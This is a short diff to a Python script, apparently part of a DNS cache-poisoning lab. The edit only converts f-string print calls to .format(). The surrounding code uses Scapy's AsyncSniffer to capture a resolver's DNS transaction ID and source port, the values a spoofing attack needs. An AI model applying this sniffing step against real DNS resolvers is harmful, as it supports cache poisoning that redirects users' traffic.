@@ -19,7 +19,7 @@ def sniff_port_and_txid(max_attempts):
     global INCR
     
     for attempt in range(1, max_attempts + 1):
-        print(f"[*] Leak attempt {attempt}/{max_attempts}...")
+        print("[*] Leak attempt {attempt}/{max_attempts}...".format(attempt=attempt, max_attempts=max_attempts))
         
         sniffer = AsyncSniffer(
             iface="eth0",
@@ -52,7 +52,7 @@ def sniff_port_and_txid(max_attempts):
             leaked_txid = caught_packet[DNS].id
             target_port = caught_packet[UDP].sport
             
-            print(f"[+] SUCCESS! Leaked TXID: {leaked_txid}, Port: {target_port}")
+            print("[+] SUCCESS! Leaked TXID: {leaked_txid}, Port: {target_port}".format(leaked_txid=leaked_txid, target_port=target_port))
             return leaked_txid, target_port
 
     print("[-] Could not leak TXID/port from local-dns to attacker.")
